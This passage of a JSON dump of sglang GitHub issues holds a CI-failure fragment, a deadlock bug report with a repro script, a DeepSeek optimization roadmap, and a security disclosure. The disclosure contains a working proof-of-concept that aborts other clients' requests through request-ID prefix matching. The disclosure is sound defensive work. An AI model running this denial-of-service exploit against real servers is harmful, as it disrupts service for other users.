48d | `test/registered/kernels/test_lean_attention.py` | `test_fp8_kv_parity (model='qwen2.5-7b', dtype=float8_e4m3fn)` | Triton ConvertTritonAMDGPUToLLVM MLIR pass failure (lean attention fp8 kv parit… | RuntimeError: PassManager::run failed — Triton ConvertTritonAMDGPUToLLVM MLIR pass failure | [job](https://github.com/sgl-project/sglang/actions/runs/33538544040/job/99958833758) | [详情](https://github.com/bingxche/sglang-ci-bot/issues/182#job-99958833758) |\n\n</details>\n\n---\n*Auto-generated by amd-bot · 2026-10-19 02:21 UTC*\n<!-- ci-failure-tracker:end -->","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/37451/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/37451/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44835","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44835/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44835/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44835/events","html_url":"https://github.com/sgl-project/sglang/issues/44835","id":5894089809,"node_id":"I_kwDOLCAjRs8AAAABX1CsUQ","number":44835,"title":"[Bug] With `pause_generation(in_place)` then `pause_generation(abort)`, the server hangs until killed by watchdog","user":{"login":"Yunzez","id":56664264,"node_id":"MDQ6VXNlcjU2NjY0MjY0","avatar_url":"https://avatars.githubusercontent.com/u/56664264?v=4","gravatar_id":"","url":"https://api.github.com/users/Yunzez","html_url":"https://github.com/Yunzez","followers_url":"https://api.github.com/users/Yunzez/followers","following_url":"https://api.github.com/users/Yunzez/following{/other_user}","gists_url":"https://api.github.com/users/Yunzez/gists{/gist_id}","starred_url":"https://api.github.com/users/Yunzez/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Yunzez/subscriptions","organizations_url":"https://api.github.com/users/Yunzez/orgs","repos_url":"https://api.github.com/users/Yunzez/repos","events_url":"https://api.github.com/users/Yunzez/events{/privacy}","received_events_url":"https://api.github.com/users/Yunzez/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":3,"created_at":"2026-10-17T02:45:09Z","updated_at":"2026-10-18T21:21:50Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\nWhile a request is generating, `POST /pause_generation {\"mode\": \"in_place\"}` returns 200 at once. A following `POST /pause_generation {\"mode\": \"abort\"}` never returns. `POST /continue_generation` then blocks as well, so the engine cannot be unpaused, and after `--watchdog-timeout` the scheduler watchdog takes the paused engine for a hang and kills the server, see log:\n\n```\n[2026-10-16 08:18:54] INFO:     127.0.0.1:60022 - \"POST /pause_generation HTTP/1.1\" 200 OK\n[2026-10-16 08:20:09] Scheduler debug info:\nscheduler.cur_batch_for_debug.batch_size()=1\n[2026-10-16 08:20:10] Scheduler watchdog timeout (self.watchdog_timeout=60.0, self.soft=False)\n[2026-10-16 08:20:15] SIGQUIT received. signum=None, frame=None. It usually means one child failed.\n```\n\nOnly the first (in_place) pause is ever logged; the abort pause and the continue never get a response.\n\nIt doesn't happen when:\n- no request is running (in_place -> abort answers in ~1 ms);\n- the abort pause comes alone (answers in ~1 s);\n- the first pause is `retract` instead of `in_place` (answers in ~1 s);\n- the running request's client disconnects between the two pauses (answers in 1 ms - 1 s);\n- the second pause is `in_place` again.\n\nRelated symptom with no abort at all: an in_place pause held longer than `--watchdog-timeout` while a request is in the running batch is also killed by the watchdog (90 s hold, `--watchdog-timeout 60`: the watchdog fired 79-86 s after the pause in 5/5 servers; with the default 300 s watchdog the 90 s hold survives). The deadlock above makes the pause unbounded, so there it always ends that way.\n\n\n### Reproduction\n\n```bash\npython -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000 --watchdog-timeout 60\npython3 repro.py http://127.0.0.1:30000      # stdlib only\n```\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal client: POST /pause_generation {\"mode\": \"in_place\"} followed by {\"mode\": \"abort\"} while a request is\ngenerating never returns; /continue_generation then blocks too, nothing can unpause the engine, and the scheduler\nwatchdog finally kills the server.\n\nServer (SGLang main):\n    python -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000 --watchdog-timeout 60\n\nRun:  python3 repro_issue.py http://127.0.0.1:30000              (stdlib only)\n      python3 repro_issue.py http://127.0.0.1:30000 --no-abort   (control: in_place pause, then continue at once)\n      python3 repro_issue.py http://127.0.0.1:30000 --no-abort --hold-s 90   (in_place pause held 90 s, no abort)\nSteps: start a streamed /generate (4000 tokens, ignore_eos) -> after its first chunk pause in_place -> pause abort\n(30 s timeout) -> continue_generation (30 s timeout).  The server is judged only after that: /health answers 503 or\nblocks while the engine is paused, so it is read once continue_generation has returned (or timed out), and \"down\"\nmeans the HTTP port refuses connections (the process exited), not a slow answer.\nExit 1 when the abort pause or the continue does not answer.\n\"\"\"\nimport json\nimport sys\nimport threading\nimport time\nimport urllib.error\nimport urllib.request\n\nBASE = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith(\"--\") else \"http://127.0.0.1:30000\"\nNO_ABORT = \"--no-abort\" in sys.argv\nHOLD_S = float(sys.argv[sys.argv.index(\"--hold-s\") + 1]) if \"--hold-s\" in sys.argv else 0.0\n\n\ndef call(path, body, timeout):\n    req = urllib.request.Request(BASE + path, json.dumps(body).encode(), {\"Content-Type\": \"application/json\"},\n                                 method=\"POST\")\n    t = time.time()\n    try:\n        with urllib.request.urlopen(req, timeout=timeout) as r:\n            return r.status, round(time.time() - t, 3)\n    except urllib.error.HTTPError as e:\n        return e.code, round(time.time() - t, 3)\n    except Exception as e:  # timeout / connection reset\n        return type(e).__name__, round(time.time() - t, 3)\n\n\ndef probe(path=\"/health\", timeout=5):\n    \"\"\"HTTP status, \"no answer\" (timed out), or \"refused\" (nothing listens: the server process is gone).\"\"\"\n    try:\n        with urllib.request.urlopen(BASE + path, timeout=timeout) as r:\n            return r.status\n    except urllib.error.HTTPError as e:\n        return e.code\n    except urllib.error.URLError as e:\n        return \"refused\" if isinstance(e.reason, ConnectionRefusedError) else \"no answer\"\n    except Exception:\n        return \"no answer\"\n\n\ndef stream(first):\n    body = {\"text\": \"Write a very long story about the sea, chapter by chapter.\", \"stream\": True,\n            \"sampling_params\": {\"max_new_tokens\": 4000, \"temperature\": 0.8, \"ignore_eos\": True}}\n    req = urllib.request.Request(BASE + \"/generate\", json.dumps(body).encode(),\n                                 {\"Content-Type\": \"application/json\"}, method=\"POST\")\n    try:\n        with urllib.request.urlopen(req, timeout=900) as r:\n            for line in r:\n                if line.startswith(b\"data:\"):\n                    first.set()\n    except Exception:\n        pass\n    first.set()\n\n\ndef main():\n    first = threading.Event()\n    threading.Thread(target=stream, args=(first,), daemon=True).start()\n    first.wait(120)\n    time.sleep(0.2)\n    t0 = time.time()\n    print(\"pause in_place:      \", call(\"/pause_generation\", {\"mode\": \"in_place\"}, 30))\n    time.sleep(HOLD_S)\n    abort = (200, 0.0) if NO_ABORT else call(\"/pause_generation\", {\"mode\": \"abort\"}, 30)\n    if not NO_ABORT:\n        print(\"pause abort:         \", abort)\n    cont = call(\"/continue_generation\", {}, 30)\n    print(\"continue_generation: \", cont)\n    hung = abort[0] != 200 or cont[0] != 200\n    if not hung:\n        h = None\n        for _ in range(12):\n            h = probe()\n            if h == 200:\n                break\n            time.sleep(5)\n        print(\"health after continue:\", h)\n        time.sleep(30)  # the scheduler watchdog SIGQUITs ~5 s after it fires: look again\n        later = probe(\"/v1/models\")\n        print(\"30 s later:           \", \"server process exited\" if later == \"refused\" else later)\n        ok = h == 200 and later != \"refused\"\n        print(\"ok\" if ok else \"SERVER DIED\")\n        return 0 if ok else 1\n    # deadlocked: watch for the server process to go away (the scheduler watchdog)\n    while time.time() - t0 < 300 and probe(\"/v1/models\") != \"refused\":\n        time.sleep(5)\n    gone = probe(\"/v1/models\") == \"refused\"\n    print(\"health after continue:\", probe(), \"| server process\",\n          \"exited %.0f s after the in_place pause\" % (time.time() - t0) if gone else \"still running, engine stuck\")\n    print(\"DEADLOCK\")\n    return 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```\n\n\nOutput: \n```\n=== fresh server 1\npause in_place:       (200, 0.003)\npause abort:          ('TimeoutError', 30.03)\ncontinue_generation:  ('TimeoutError', 30.008)\nhealth after continue: refused | server process exited 151 s after the in_place pause\nDEADLOCK\n=== fresh server 2\npause in_place:       (200, 0.003)\npause abort:          ('TimeoutError', 30.02)\ncontinue_generation:  ('TimeoutError', 30.001)\nhealth after continue: refused | server process exited 162 s after the in_place pause\nDEADLOCK\n=== fresh server 3\npause in_place:       (200, 0.003)\npause abort:          ('TimeoutError', 30.005)\ncontinue_generation:  ('TimeoutError', 30.007)\nhealth after continue: refused | server process exited 162 s after the in_place pause\nDEADLOCK\n```\n\n\n**Possible cause, assisted by Claude**\n\n1. `in_place` pause (`Scheduler.pause_generation`) only sets `_engine_paused`; `running_batch`, `last_batch` and `cur_batch_for_debug` are kept, and the event loop skips every forward step while paused.\n2. `abort` pause is handled in `TokenizerManager.pause_generation`: inside `async with self.is_pause_cond` it loops `abort_request(abort_all=True)` + `asyncio.sleep(1)` until `model_update_lock` is no longer locked. Every in-flight generate request holds that lock's reader side.\n3. Aborting a request that is in the running batch only sets `req.to_finish`; the request finishes (and its handler releases the reader lock) on the next forward step, which the paused scheduler never runs. The loop in (2) never ends.\n4. `continue_generation` needs the same `is_pause_cond`, which the looping abort pause holds, so it cannot clear the pause.\n5. The scheduler watchdog is active whenever `cur_batch_for_debug` is set and `forward_ct` does not move; it does not check `_engine_paused`, so the paused engine is killed as hung (this also kills a long in_place pause with no abort).\n\n\n### Environment\n\n<details>\n<summary><code>python -m sglang.check_env</code></summary>\n\n```text\nPython: 3.12.3 (main, Apr 23 2024, 14:57:18) [GCC 11.4.1 20230605 (Red Hat 11.4.1-2)]\nCUDA available: True\nGPU 0: NVIDIA RTX A5000\nGPU 0 Compute Capability: 8.6\nCUDA_HOME: <venv>/lib/python3.12/site-packages/nvidia/cu13\nNVCC: Cuda compilation tools, release 13.0, V13.0.88\nCUDA Driver Version: 595.91.07\nPyTorch: 2.14.1+cu130\nsglang: 0.0.0.dev1+g7224fce1b\nsglang-kernel: 0.4.9\nflashinfer_python: 0.7.1\nflashinfer_cubin: Module Not Found\nflashinfer_jit_cache: Module Not Found\ntriton: 3.8.0\ntransformers: 5.19.0\ntorchao: Module Not Found\nnumpy: 2.3.5\naiohttp: 3.14.5\nfastapi: 0.143.0\nhuggingface_hub: 1.33.0\ninteregular: 0.3.3\nmodelscope: 1.40.2\norjson: 3.13.0\noutlines: 0.1.11\npackaging: 26.3\npsutil: 7.2.2\npydantic: 2.14.1\npython-multipart: 0.0.32\npyzmq: 27.2.0\nuvicorn: 0.54.0\nuvloop: 0.23.0\nvllm: Module Not Found\nxgrammar: 0.2.7\nopenai: 2.6.1\ntiktoken: 0.14.0\nanthropic: 1.13.0\nlitellm: Module Not Found\ntorchcodec: 0.17.0\nNVIDIA Topology: \n\tGPU0\tNIC0\tCPU Affinity\tNUMA Affinity\tGPU NUMA ID\nGPU0\t X \tNODE\t\t1\t\tN/A\nNIC0\tNODE\t X \t\t\t\t\n\nLegend:\n\n  X    = Self\n  SYS  = Connection traversing PCIe as well as the SMP interconnect between NUMA nodes (e.g., QPI/UPI)\n  NODE = Connection traversing PCIe as well as the interconnect between PCIe Host Bridges within a NUMA node\n  PHB  = Connection traversing PCIe as well as a PCIe Host Bridge (typically the CPU)\n  PXB  = Connection traversing multiple PCIe bridges (without traversing the PCIe Host Bridge)\n  PIX  = Connection traversing at most a single PCIe bridge\n  NV#  = Connection traversing a bonded set of # NVLinks\n\nNIC Legend:\n\n  NIC0: mlx5_bond_0\n\n\nulimit soft: 1024\n```\n\n</details>","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44835/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44835/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/42170","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/42170/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/42170/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/42170/events","html_url":"https://github.com/sgl-project/sglang/issues/42170","id":5671715031,"node_id":"I_kwDOLCAjRs8AAAABUg-A1w","number":42170,"title":"[Roadmap] DeepSeek V4.1 Optimization","user":{"login":"Oasis-Git","id":55017812,"node_id":"MDQ6VXNlcjU1MDE3ODEy","avatar_url":"https://avatars.githubusercontent.com/u/55017812?v=4","gravatar_id":"","url":"https://api.github.com/users/Oasis-Git","html_url":"https://github.com/Oasis-Git","followers_url":"https://api.github.com/users/Oasis-Git/followers","following_url":"https://api.github.com/users/Oasis-Git/following{/other_user}","gists_url":"https://api.github.com/users/Oasis-Git/gists{/gist_id}","starred_url":"https://api.github.com/users/Oasis-Git/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Oasis-Git/subscriptions","organizations_url":"https://api.github.com/users/Oasis-Git/orgs","repos_url":"https://api.github.com/users/Oasis-Git/repos","events_url":"https://api.github.com/users/Oasis-Git/events{/privacy}","received_events_url":"https://api.github.com/users/Oasis-Git/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":8,"created_at":"2026-10-02T01:52:47Z","updated_at":"2026-10-18T17:55:43Z","closed_at":null,"assignee":null,"author_association":"COLLABORATOR","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"Track optimization and feature support for DeepSeek V4.1 in SGLang.\n\n## Refactor\n\n- [x] mHC (DSV41 only) code clean up —  #42245\n## General optimization\n\n- [ ] Prefill optimizations\n  - [ ] mHC SP + engram fusion — #43065\n  - [x] Fold `q_rope_store` into `fused_q_norm_rope` — #41657\n  - [x] Faster FP4 index-K gather and `combine_topk_swa_indices` — #41658\n  - [x] Prefill indexer: raw selection, row-pair schedule IDs, and host synchronization removal — #41659\n  - [x] Fused c1/c2 compression for eager extend and faster c2 decode — #41660\n  - [x] Trim prefill model-entry overhead — #41704\n- [ ] Decode optimizations\n  - [ ] TP4 low latency attention layer #44933 \n- [x] Add opt-in TRT-LLM sparse attention support — #41603 \n- [ ] Integrate the MegaMoE update: locality-aware scheduling, epilogue prefetch, and shared-memory optimizations — [DeepGEMM #462](https://github.com/deepseek-ai/DeepGEMM/pull/462)\n- [x] Add MegaMHC support — #42808 \n- [ ] Integrate DeepEP V2.5: migrate to dedicated buffer APIs and enable the new communication optimizations — [DeepEP #763](https://github.com/deepseek-ai/DeepEP/pull/763)\n- [ ] Packed BF16 prefill on B200/B300 — #41512\n- [ ] Fuse source prefill Top-K and block maxima — #41627\n- [ ] Use CUDA candidate selection in dense prefill — #40521\n- [ ] Shard Engram WKV projections — #40508\n- [x] Cache MXFP8 dispatch — #42156\n- [ ] Persist FlashInfer autotune measurement policies with cached tactics — #42158\n- [x] Reduce eager Engram extend preparation — #42159\n- [ ] Replace the legacy topk-v2 with DeepSelect (need LL optimization) — #44051 \n\n## Feature: bounded replay\n\nGoal: both replay flags on by default — same accuracy, never slower than off, faster prefill.\n\n### Encoder replay\n\n- [x] Fix SWA page size with bounded replay — #42128\n- [x] Bounded replay with sparse mla - #42273 \n- [ ] Enable encoder bounded replay.\n  - [x] Fold the replay into the extend forward (16 × 64K hits: 4.6 s → 1.0 s TTFT) — #43166, #43165\n  - [ ] Cut decode request-window copies (+6–11 ms → +0.3 ms per step) — #42715\n  - [ ] Cut prefill request-window overhead (cold prefill gap 26% → 2%) — #42921\n  - [ ] Serve HiCache host-tier hits — #42716\n  - [x] Keep the DSpark draft SWA from cutting prefix hits — #44673\n\n### Decoder replay and prefill graph\n\n- [ ] Enable decoder bounded replay.\n  - [x] Serve prompt-logprob requests under decoder replay — #44850\n  - [ ] Enable the prefill CUDA graph by default for DeepSeek-V4.1 (+19% cold prefill) — #43440 \n  - [ ] Make both replay flags compatible with the prefill graph\n  - [ ] Capture eager prefill layers as graphs (+54% cold prefill)\n  - [ ] Lift the 16K prefill-graph cap; faster prefill all-reduce\n\n### Compatibility and default\n\n- [ ] Support decoder SWA bounded replay with prefill CP and static DSpark PD — #40161\n- [ ] DP attention and PD disaggregation\n- [ ] Turn both replay flags on by default\n\n## Feature: PD\n\nOriginal roadmap: #39700 (B200).\n\n### Prefill\n\n- [ ] Support context parallelism — #40323\n- [ ] Support CP with breakable CUDA graphs — #40333\n- [ ] Avoid host synchronization in CP prefill — #40335\n- [ ] Support CP with multistream forward preparation — #40179\n- [ ] Reuse shared compressed KV dequantization — #40421\n- [ ] Fuse candidate selection and masking — #40436\n- [ ] Capture indexer and compressor in breakable CUDA graphs — #40548\n\n### Decode\n\n- [x] Support DP attention — #40177\n- [ ] Support MegaMoE — #40178\n\n## Hopper optimization\n\n- [x] Optimize dense GEMM, indexer, mHC, and MoE paths on Hopper — #41251\n- [ ] Support candidate-only SM90 indexer scoring — #40860\n- [ ] Skip invisible SM90 FP4 indexer tiles — #40503\n- [ ] Add an FP8 Tensor Core path for the FP4 grouped indexer — #40160\n- [ ] Use DeepSelect Top-K with fused page mapping for Hopper decode — #41561\n- [ ] Enable Hopper decode optimizations for TP8 — #39114\n- [ ] Add H20 block-FP8 tuned configurations — #41098\n- [ ] Add and extend H200 block-FP8 tuned configurations — #40452\n\n\n\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/42170/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/42170/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/45002","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/45002/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/45002/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/45002/events","html_url":"https://github.com/sgl-project/sglang/issues/45002","id":5909949524,"node_id":"I_kwDOLCAjRs8AAAABYEKsVA","number":45002,"title":"[Bug] Client-controlled RID prefix allows cross-request abort through disconnect cleanup","user":{"login":"yyymk","id":133664083,"node_id":"U_kgDOB_eNUw","avatar_url":"https://avatars.githubusercontent.com/u/133664083?v=4","gravatar_id":"","url":"https://api.github.com/users/yyymk","html_url":"https://github.com/yyymk","followers_url":"https://api.github.com/users/yyymk/followers","following_url":"https://api.github.com/users/yyymk/following{/other_user}","gists_url":"https://api.github.com/users/yyymk/gists{/gist_id}","starred_url":"https://api.github.com/users/yyymk/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/yyymk/subscriptions","organizations_url":"https://api.github.com/users/yyymk/orgs","repos_url":"https://api.github.com/users/yyymk/repos","events_url":"https://api.github.com/users/yyymk/events{/privacy}","received_events_url":"https://api.github.com/users/yyymk/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-10-18T13:20:55Z","updated_at":"2026-10-18T13:20:55Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\n> **Disclosure note:** This issue was first reported privately through GitHub Security Advisories on **August 2, 2026** as **GHSA-c7p3-8wqm-7cq3**. The private report has never been processed since then, so we are now disclosing it publicly. Public issue #41474 (opened September 27, 2026) and the unmerged fix PRs #41481 / #41502 / #43476 later described the same root cause.\n\nSGLang accepts a client-controlled request ID (`rid`) on the normal streaming generation API. When that client disconnects, delayed cleanup sends an abort for the supplied ID. `Scheduler.abort_request()` treats that ID as a prefix and cancels every active request whose ID starts with it. A remote API client can use a short `rid` to abort unrelated concurrent requests, including requests with default UUID IDs. We reproduced this on stock SGLang 0.5.15.post1 in both a single-worker server and a 1-prefill/1-decode deployment behind sglang-router 0.3.2. The same code path is present in SGLang 0.5.16. The suggested severity is High because an unauthenticated client on a default exposed API can repeatedly deny generation service to other clients.\n\n`GenerateReqInput._normalize_single_inputs()` creates a UUID only when `rid` is `None`, so a supplied value is preserved:\n\n```python\nif self.rid is None:\n    self.rid = uuid.uuid4().hex\n```\n\nTested source: https://github.com/sgl-project/sglang/blob/0b3bb0cbe31873994c9f989fddfe2f87ca839fdd/python/sglang/srt/managers/io_struct.py#L427-L431\n\nFor a streaming response, `TokenizerManager.create_abort_task()` installs a background task. The task sleeps for two seconds and then calls `abort_request(obj.rid)`. `TokenizerManager.abort_request()` checks whether that exact ID is still present in `rid_to_state` before dispatching `AbortReq`. A long attacker request remains active on the server after its client closes the stream, so this check passes.\n\n```python\nasync def abort_request():\n    await asyncio.sleep(2)\n    if obj.is_single:\n        self.abort_request(obj.rid)\n```\n\nTested source: https://github.com/sgl-project/sglang/blob/0b3bb0cbe31873994c9f989fddfe2f87ca839fdd/python/sglang/srt/managers/tokenizer_manager.py#L1677-L1689 and https://github.com/sgl-project/sglang/blob/0b3bb0cbe31873994c9f989fddfe2f87ca839fdd/python/sglang/srt/managers/tokenizer_manager.py#L1808-L1818\n\n`Scheduler.abort_request()` then applies the abort with `req.rid.startswith(recv_req.rid)` instead of exact equality. The prefix match is used for chunked, waiting, grammar, PD prefill, PD decode, and running requests. A cleanup request for `rid=\"a\"` can therefore abort a different request such as `rid=\"a-victim\"`.\n\n```python\nfor req in inflight_reqs:\n    if not req.finished() and (\n        recv_req.abort_all or req.rid.startswith(recv_req.rid)\n    ):\n        req.to_finish = FINISH_ABORT()\n```\n\nTested source: https://github.com/sgl-project/sglang/blob/0b3bb0cbe31873994c9f989fddfe2f87ca839fdd/python/sglang/srt/managers/scheduler.py#L3877-L3987\n\nThe latest release inspected, SGLang 0.5.16 at commit `fdebc938f7f4d16fe6b9f55dcd9a767cf0899ea1`, still contains the eight prefix comparisons, the exact state gate, and the delayed cleanup path: https://github.com/sgl-project/sglang/blob/fdebc938f7f4d16fe6b9f55dcd9a767cf0899ea1/python/sglang/srt/managers/scheduler.py#L4029-L4156, https://github.com/sgl-project/sglang/blob/fdebc938f7f4d16fe6b9f55dcd9a767cf0899ea1/python/sglang/srt/managers/tokenizer_manager.py#L1711-L1724, and https://github.com/sgl-project/sglang/blob/fdebc938f7f4d16fe6b9f55dcd9a767cf0899ea1/python/sglang/srt/managers/tokenizer_manager.py#L1845-L1854\n\nReplacing the request-specific prefix comparisons with exact equality stopped the cross-request abort in 5/5 single-worker trials and 5/5 PD trials after all worker processes were reloaded. A fix should use exact request identity for ordinary aborts and keep any intentional bulk-abort operation separate and explicitly authorized. Server-generated or server-namespaced request IDs would provide additional isolation.\n\n### Reproduction\n\nThe runtime test used SGLang 0.5.15.post1, Python 3.12.13, Linux 6.8, and Qwen3-8B. The PD test used sglang-router 0.3.2 with one prefill worker, one decode worker, and the Mooncake transfer backend. The minimal PoC below uses only the standard Python library. Run it only against an isolated server that you own.\n\nStart a stock single-worker server:\n\n```bash\npython -m sglang.launch_server \\\n  --model-path Qwen/Qwen3-8B \\\n  --host 127.0.0.1 \\\n  --port 30000 \\\n  --tp-size 1 \\\n  --context-length 4096 \\\n  --disable-cuda-graph\n```\n\nSave and run this script while the server is idle except for the two PoC requests:\n\n```python\n#!/usr/bin/env python3\nimport json\nimport secrets\nimport threading\nimport time\nimport urllib.request\n\nBASE = \"http://127.0.0.1:30000\"\nTOKENS = 1024\n\n\ndef payload(text, rid):\n    return json.dumps({\n        \"text\": text,\n        \"rid\": rid,\n        \"stream\": True,\n        \"sampling_params\": {\n            \"max_new_tokens\": TOKENS,\n            \"temperature\": 0,\n            \"ignore_eos\": True,\n        },\n    }).encode()\n\n\ndef stream(rid, text, first_event=None, disconnect=False):\n    result = {\"first\": None, \"disconnect\": None, \"finish\": None,\n              \"finish_reason\": None, \"observed_id\": None}\n    request = urllib.request.Request(\n        BASE + \"/generate\",\n        data=payload(text, rid),\n        headers={\"Content-Type\": \"application/json\", \"Accept\": \"text/event-stream\"},\n        method=\"POST\",\n    )\n    response = urllib.request.urlopen(request, timeout=60)\n    for raw_line in response:\n        line = raw_line.strip()\n        if not line.startswith(b\"data:\"):\n            continue\n        encoded = line[5:].strip()\n        if encoded == b\"[DONE]\":\n            result[\"finish\"] = time.monotonic()\n            break\n        event = json.loads(encoded)\n        meta = event.get(\"meta_info\") or {}\n        result[\"observed_id\"] = meta.get(\"id\", result[\"observed_id\"])\n        if meta.get(\"finish_reason\") is not None:\n            result[\"finish_reason\"] = meta[\"finish_reason\"]\n        if result[\"first\"] is None and event.get(\"text\"):\n            result[\"first\"] = time.monotonic()\n            if first_event:\n                first_event.set()\n            if disconnect:\n                result[\"disconnect\"] = time.monotonic()\n                response.close()\n                return result\n    result[\"finish\"] = result[\"finish\"] or time.monotonic()\n    return result\n\n\nprefix = \"poc\" + secrets.token_hex(4)\nvictim_rid = prefix + \"-victim-\" + secrets.token_hex(3)\nvictim_first = threading.Event()\nvictim_box = {}\n\n\ndef run_victim():\n    victim_box[\"result\"] = stream(\n        victim_rid,\n        \"Write a long detailed textbook chapter. Continue without stopping.\",\n        first_event=victim_first,\n    )\n\n\nthread = threading.Thread(target=run_victim, daemon=True)\nthread.start()\nassert victim_first.wait(30), \"victim did not produce a first token\"\ntime.sleep(0.3)\nattacker = stream(\n    prefix,\n    \"Count slowly from 1 to 10000 with explanations.\",\n    disconnect=True,\n)\nthread.join(60)\nvictim = victim_box[\"result\"]\ndelta = victim[\"finish\"] - attacker[\"disconnect\"]\nprint(json.dumps({\n    \"victim_rid\": victim_rid,\n    \"attacker_rid\": prefix,\n    \"prefix_relation\": victim_rid.startswith(prefix),\n    \"victim_finish_reason\": victim[\"finish_reason\"],\n    \"disconnect_to_victim_finish_seconds\": round(delta, 3),\n    \"victim_observed_id\": victim[\"observed_id\"],\n    \"attacker_observed_id\": attacker[\"observed_id\"],\n}, indent=2))\n```\n\nOn an affected server, the victim finishes with `{\"type\":\"abort\",\"message\":\"Aborted\"}` about two seconds after the attacker stream is closed. The expected safe result is that only the attacker request is cleaned up and the victim reaches its normal length finish.\n\nThe corrected test matrix produced these results:\n\n| Topology and condition | Valid trials | Victim aborts |\n| --- | ---: | ---: |\n| Stock single worker, prefix attacker disconnect | 5 | 5 |\n| Stock single worker, non-prefix attacker disconnect | 5 | 0 |\n| Stock single worker, prefix attacker completes normally | 5 | 0 |\n| Exact-equality control, single worker | 5 | 0 |\n| Stock 1P1D router, prefix attacker disconnect | 5 | 5 |\n| Stock 1P1D router, non-prefix attacker disconnect | 5 | 0 |\n| Stock 1P1D router, prefix attacker completes normally | 5 | 0 |\n| Exact-equality control, 1P1D with workers reloaded | 5 | 0 |\n\nThe mean disconnect-to-abort time was 2.037 seconds on the single worker and 2.060 seconds through the 1P1D router. All health checks stayed successful. In a separate stock 1P1D test, eight concurrent victims omitted `rid` and received default 32-character hexadecimal IDs. Disconnecting one long attacker for each one-character prefix `0` through `f` aborted all eight victims in each of five independent rounds, for 40/40 victim aborts. Each victim abort occurred 2.030 to 2.055 seconds after its matching prefix attacker disconnected.\n\n### Environment\n\n- SGLang `0.5.15.post1` (runtime test); the same code path is also present in `0.5.16` (commit `fdebc938f7f4d16fe6b9f55dcd9a767cf0899ea1`) and in the public issue's version `0.5.19`\n- Python 3.12.13, Linux 6.8, Ubuntu 22.04\n- Model: `Qwen/Qwen3-8B`, launched with `--tp-size 1 --context-length 4096 --disable-cuda-graph`\n- Single-worker test: `python -m sglang.launch_server` on `127.0.0.1:30000`\n- PD test: sglang-router `0.3.2`, one prefill worker + one decode worker, Mooncake transfer backend\n- Hardware: 2× NVIDIA A100 80 